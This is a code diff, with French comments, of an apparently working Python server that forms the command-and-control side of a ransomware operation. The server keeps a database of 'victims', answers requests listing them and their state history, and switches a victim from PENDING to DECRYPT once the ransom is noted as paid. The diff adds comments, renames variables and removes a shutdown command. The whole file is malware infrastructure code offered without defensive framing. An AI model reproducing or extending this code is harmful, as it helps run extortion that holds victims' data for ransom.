@@ -7,7 +7,6 @@ import random
 import string
 
 
-
 def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
     """
     Générer une clé de longueur (longueur) contenant uniquement les caractères (caracteres)
@@ -20,7 +19,6 @@ def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
 def main():
     # Démarrer le serveur
     socket_server = network.start_net_serv()
-    print("Serveur démarré")
     # Initialiser la base de données
     conn = data.connect_db()
     if conn is not None:
@@ -31,50 +29,59 @@ def main():
     print("En attente de messages...")
     while True:
         client_socket, address = socket_server.accept()
-        msg1 = network.receive_message(client_socket)
-        if msg1 is None:
+        message_console = network.receive_message(client_socket)
+        # Si aucun message n'est reçu, fermer la connexion avec ce client et attendre le suivant
+        if message_console is None:
             print("Aucun message reçu, connexion fermée.")
             client_socket.close()
-            continue  # Skip further processing and wait for the next connection
-        print(f"Message reçu: {msg1}")
-        print(f"Message de type: {message.get_message_type(msg1)}")
-        type_message = message.get_message_type(msg1)
+            continue  # Attendre le prochain client
+        # Afficher le message reçu
+        print(f"Message reçu: {message_console}")
+        print(f"Message de type: {message.get_message_type(message_console)}")
+        type_message = message.get_message_type(message_console)
+        # Traiter le message reçu de type LIST_REQ
         if type_message == "LIST_REQ":
             victims = data.get_list_victims(conn)
+            # Envoi de la réponse de type LIST_VICTIM_RESP (pour chaque victime)
             for i in range(len(victims)):
                 victime = victims[i]
-                # Envoi de la réponse
+                # Envoi de la réponse de type LIST_VICTIM_RESP
                 message_response = message.set_message("LIST_VICTIM_RESP", victime)
                 print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                 network.send_message(client_socket, message_response)
                 print("Message envoyé")
+                # Envoi de la réponse de type LIST_VICTIM_END
                 if i == len(victims)-1:
                     message_response = message.set_message("LIST_VICTIM_END")
                     print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                     network.send_message(client_socket, message_response)
                     print("Message envoyé")
+        # Traiter le message reçu de type HIST_REQ
         elif type_message == "HIST_REQ":
-            # Récupérer l'historique
+            # Récupérer l'historique en fonction de l'id de la victime
             victim = network.receive_message(client_socket)
             history = data.get_list_history(conn, victim)
-
+            # Envoi de la réponse de type HISTORY_RESP (pour chaque élément de l'historique)
             for i in range(len(history)):
                 message_response = message.set_message("HISTORY_RESP", history[i])
                 print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                 network.send_message(client_socket, message_response)
                 print("Message envoyé")
+                # Envoi de la réponse de type HISTORY_END
                 if i == len(history)-1:
                     message_response = message.set_message("HISTORY_END")
                     print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                     network.send_message(client_socket, message_response)
                     print("Message envoyé")
+        # Traiter le message reçu de type CHGSTATE
         elif type_message == "CHGSTATE":
-            # récupérer l'état actuel de la victime
+            # récupérer l'état actuel en fonction de l'id de la victime
             victim_id = network.receive_message(client_socket)
             history = data.get_list_history(conn, victim_id)
             if len(history) > 0:
+                # Récupérer le dernier état de la victime
                 state = history[-1][3]
-                print(state)
+                # Si l'état est PENDING, changer l'état de la victime en DECRYPT
                 if state == "PENDING":
                     # Changer l'état de la victime
                     items = ["id_states", "id_victim", "datetime", "state"]
@@ -85,31 +92,27 @@ def main():
                     print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                     network.send_message(client_socket, message_response)
                     print("Message envoyé")
+                # Si l'état est DECRYPT, changer l'état de la victime en DECRYPTED
                 elif state == "DECRYPT":
                     print(f"La victime {victim_id} a payé la rançon et est déja décryptée.")
                     message_response = message.set_message("CHANGE_STATE", ["DECRYPTED"])
                     print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                     network.send_message(client_socket, message_response)
                     print("Message envoyé")
-
+                # Si l'état est différent de pending ou decrypt, afficher ce message
                 else:
                     print(f"La victime {victim_id} est déjà dans l'état {state}.")
                     message_response = message.set_message("CHANGE_STATE", [state])
                     print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                     network.send_message(client_socket, message_response)
                     print("Message envoyé")
+            # Si la victime n'a pas d'historique, afficher ce message
             else:
                 print(f"La victime {victim_id} n'a pas d'historique.")
                 message_response = message.set_message("CHANGE_STATE", ["UNKNOWN"])
                 print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                 network.send_message(client_socket, message_response)
                 print("Message envoyé")
-        elif type_message == "STOP_SERV":
-            print("Arrêt du serveur demandé.")
-            print("Arrêt du serveur...")
-            socket_server.close()
-            print("Serveur arrêté.")
-            break
         else:
             print("Aucun message à envoyer.")
 
